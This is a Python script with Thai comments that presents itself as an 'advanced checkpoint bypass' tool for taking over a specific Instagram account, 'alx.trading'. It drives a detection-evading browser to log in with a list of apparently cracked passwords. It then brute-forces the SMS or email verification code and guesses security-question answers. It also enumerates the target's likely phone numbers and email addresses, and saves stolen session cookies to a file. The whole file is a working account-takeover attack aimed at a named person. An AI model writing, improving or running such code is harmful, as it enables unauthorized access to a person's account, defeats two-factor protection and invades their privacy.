#!/usr/bin/env python3
"""
ADVANCED CHECKPOINT BYPASS TOOLS
เครื่องมือขั้นสูงสำหรับ bypass Instagram checkpoint
"""

import requests
import json
import time
import random
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc

class AdvancedCheckpointBypass:
    def __init__(self):
        self.driver = None
        self.session = requests.Session()
        
    def setup_browser(self):
        """เตรียม browser ที่หลบการตรวจจับ"""
        try:
            # ใช้ undetected-chromedriver
            options = uc.ChromeOptions()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            # Random user agent
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            options.add_argument(f"--user-agent={random.choice(user_agents)}")
            
            self.driver = uc.Chrome(options=options)
            
            # Execute script to remove webdriver detection
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print("✅ Advanced browser setup complete")
            return True
            
        except Exception as e:
            print(f"❌ Browser setup error: {e}")
            return False
    
    def visual_checkpoint_bypass(self, username, password):
        """ใช้ browser automation เพื่อ bypass checkpoint"""
        if not self.setup_browser():
            return False
            
        try:
            print(f"🔄 Visual bypass for {username}:{password}")
            
            # ไปหน้า login
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(3, 5))
            
            # กรอก username
            username_field = self.driver.find_element(By.NAME, "username")
            username_field.clear()
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            
            time.sleep(random.uniform(1, 2))
            
            # กรอก password
            password_field = self.driver.find_element(By.NAME, "password")
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            
            time.sleep(random.uniform(1, 2))
            
            # คลิก login
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            time.sleep(random.uniform(5, 8))
            
            # ตรวจสอบว่าเข้าไปหน้า checkpoint มั้ย
            current_url = self.driver.current_url
            
            if "checkpoint" in current_url:
                print("🎯 Checkpoint detected - attempting bypass...")
                return self.handle_visual_checkpoint()
            elif "instagram.com" in current_url and "login" not in current_url:
                print("✅ Login successful - no checkpoint!")
                return self.extract_session_from_browser()
            else:
                print("❌ Login failed or blocked")
                return False
                
        except Exception as e:
            print(f"❌ Visual bypass error: {e}")
            return False
        finally:
            if self.driver:
                self.driver.quit()
    
    def handle_visual_checkpoint(self):
        """จัดการ checkpoint ใน browser"""
        try:
            print("🔍 Analyzing checkpoint page...")
            
            # หาปุ่ม verification options
            try:
                # ลองคลิกส่ง SMS
                sms_option = self.driver.find_element(By.XPATH, "//button[contains(text(), 'SMS') or contains(text(), 'Phone')]")
                sms_option.click()
                time.sleep(3)
                
                print("📱 SMS verification requested")
                
                # ลอง bruteforce verification code
                return self.visual_code_bruteforce()
                
            except:
                try:
                    # ลองคลิกส่ง Email
                    email_option = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Email')]")
                    email_option.click()
                    time.sleep(3)
                    
                    print("📧 Email verification requested")
                    
                    # ลอง bruteforce verification code
                    return self.visual_code_bruteforce()
                    
                except:
                    print("❌ No verification options found")
                    return False
                    
        except Exception as e:
            print(f"❌ Checkpoint handling error: {e}")
            return False
    
    def visual_code_bruteforce(self):
        """Bruteforce verification code ใน browser"""
        common_codes = [
            "123456", "000000", "111111", "222222", "333333",
            "444444", "555555", "666666", "777777", "888888", 
            "999999", "654321", "123123", "456456", "789789",
            "111222", "222333", "333444", "444555", "555666"
        ]
        
        try:
            for code in common_codes:
                print(f"🔢 Trying verification code: {code}")
                
                # หา input field สำหรับ verification code
                try:
                    code_field = self.driver.find_element(By.NAME, "verificationCode")
                except:
                    try:
                        code_field = self.driver.find_element(By.NAME, "security_code")
                    except:
                        code_field = self.driver.find_element(By.XPATH, "//input[@type='text' or @type='tel']")
                
                code_field.clear()
                time.sleep(0.5)
                
                # พิมพ์ code ทีละตัว
                for digit in code:
                    code_field.send_keys(digit)
                    time.sleep(random.uniform(0.2, 0.5))
                
                time.sleep(1)
                
                # คลิกปุ่ม Submit
                try:
                    submit_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Submit') or contains(text(), 'Confirm') or contains(text(), 'Next')]")
                    submit_button.click()
                except:
                    # ลองกด Enter
                    code_field.send_keys('\n')
                
                time.sleep(random.uniform(3, 5))
                
                # ตรวจสอบผลลัพธ์
                current_url = self.driver.current_url
                
                if "instagram.com" in current_url and "checkpoint" not in current_url and "login" not in current_url:
                    print(f"🎯 VERIFICATION CODE SUCCESS: {code}")
                    return self.extract_session_from_browser()
                elif "error" in self.driver.page_source.lower() or "incorrect" in self.driver.page_source.lower():
                    print(f"❌ Code {code} incorrect")
                    continue
                else:
                    print(f"🤔 Code {code} - unclear result")
                    
                time.sleep(random.uniform(2, 4))
            
            print("❌ All verification codes failed")
            return False
            
        except Exception as e:
            print(f"❌ Code bruteforce error: {e}")
            return False
    
    def extract_session_from_browser(self):
        """ดึง session จาก browser"""
        try:
            # ดึง cookies
            cookies = self.driver.get_cookies()
            
            sessionid = None
            ds_user_id = None
            
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    sessionid = cookie['value']
                elif cookie['name'] == 'ds_user_id':
                    ds_user_id = cookie['value']
            
            if sessionid:
                session_data = {
                    "sessionid": sessionid,
                    "ds_user_id": ds_user_id,
                    "extracted_at": time.time(),
                    "method": "visual_bypass",
                    "all_cookies": cookies
                }
                
                filename = f"bypassed_session_{int(time.time())}.json"
                with open(filename, 'w') as f:
                    json.dump(session_data, f, indent=2)
                
                print(f"✅ Session extracted: {filename}")
                print(f"🔑 SessionID: {sessionid[:30]}...")
                
                return True
            else:
                print("❌ No sessionid found")
                return False
                
        except Exception as e:
            print(f"❌ Session extraction error: {e}")
            return False

class SocialEngineeringBypass:
    """วิธี bypass ด้วย Social Engineering"""
    
    def __init__(self):
        pass
    
    def phone_number_enumeration(self, target_info):
        """หาเบอร์โทรของ target"""
        print("📱 PHONE NUMBER ENUMERATION")
        
        # Common phone patterns สำหรับ target
        possible_patterns = [
            "66812345678",  # Thai mobile
            "66987654321",
            "66623456789",  # Thai landline
            "1234567890",   # US
            "447700900123", # UK
            "33123456789",  # France
        ]
        
        # ถ้ารู้ข้อมูลส่วนตัวของ target
        if target_info:
            birth_year = target_info.get('birth_year', '')
            birth_month = target_info.get('birth_month', '')
            birth_day = target_info.get('birth_day', '')
            
            # สร้างเบอร์ที่เป็นไปได้จากวันเกิด
            if birth_year:
                possible_patterns.extend([
                    f"668{birth_year[-2:]}*****",
                    f"6698{birth_month}{birth_day}***",
                    f"662{birth_year}****"
                ])
        
        print("🔍 Possible phone numbers:")
        for pattern in possible_patterns:
            print(f"  📞 {pattern}")
        
        return possible_patterns
    
    def email_enumeration(self, username):
        """หา email addresses ที่เป็นไปได้"""
        print("📧 EMAIL ENUMERATION")
        
        common_domains = [
            "gmail.com", "yahoo.com", "hotmail.com", "outlook.com",
            "icloud.com", "protonmail.com", "live.com"
        ]
        
        possible_emails = []
        
        for domain in common_domains:
            possible_emails.extend([
                f"{username}@{domain}",
                f"{username}.trading@{domain}",
                f"alx.{username}@{domain}",
                f"{username}123@{domain}",
                f"{username}_official@{domain}"
            ])
        
        print("🔍 Possible email addresses:")
        for email in possible_emails:
            print(f"  📮 {email}")
        
        return possible_emails
    
    def security_question_attack(self):
        """โจมตี security questions"""
        print("🔐 SECURITY QUESTION ATTACK")
        
        common_answers = [
            # Pet names
            "Fleming", "Max", "Buddy", "Charlie", "Bella",
            # Cities
            "Bangkok", "London", "New York", "Paris", "Tokyo",
            # Mother's maiden name
            "Smith", "Johnson", "Williams", "Brown", "Jones",
            # First school
            "Elementary", "Primary", "High School", "University"
        ]
        
        print("🎯 Common security question answers to try:")
        for answer in common_answers:
            print(f"  🔑 {answer}")
        
        return common_answers

def run_advanced_bypass():
    """รันการ bypass แบบครบวงจร"""
    print("🚀 ADVANCED CHECKPOINT BYPASS SYSTEM")
    print("=" * 50)
    
    # ข้อมูล target
    target = "alx.trading"
    valid_passwords = ["Fleming654", "Fleming786", "Fleming1004", "Fleming1060", "Fleming1182", "Fleming1998"]
    
    print(f"🎯 Target: {target}")
    print(f"✅ Valid passwords: {len(valid_passwords)}")
    
    # Social Engineering
    se_bypass = SocialEngineeringBypass()
    
    target_info = {
        'birth_year': '1998',  # จาก Fleming1998 
        'birth_month': '06',
        'birth_day': '54'      # จาก Fleming654
    }
    
    phones = se_bypass.phone_number_enumeration(target_info)
    emails = se_bypass.email_enumeration(target)
    security_answers = se_bypass.security_question_attack()
    
    # Visual Bypass
    visual_bypass = AdvancedCheckpointBypass()
    
    for password in valid_passwords:
        print(f"\n--- Testing visual bypass with {password} ---")
        
        success = visual_bypass.visual_checkpoint_bypass(target, password)
        
        if success:
            print(f"🎉 VISUAL BYPASS SUCCESS with {password}!")
            break
        
        time.sleep(random.uniform(5, 10))

if __name__ == "__main__":
    # ติดตั้ง dependencies ที่จำเป็น
    print("📦 Installing required packages...")
    import subprocess
    import sys
    
    packages = [
        "selenium",
        "undetected-chromedriver"
    ]
    
    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"✅ Installed {package}")
        except:
            print(f"❌ Failed to install {package}")
    
    # รัน bypass
    run_advanced_bypass()
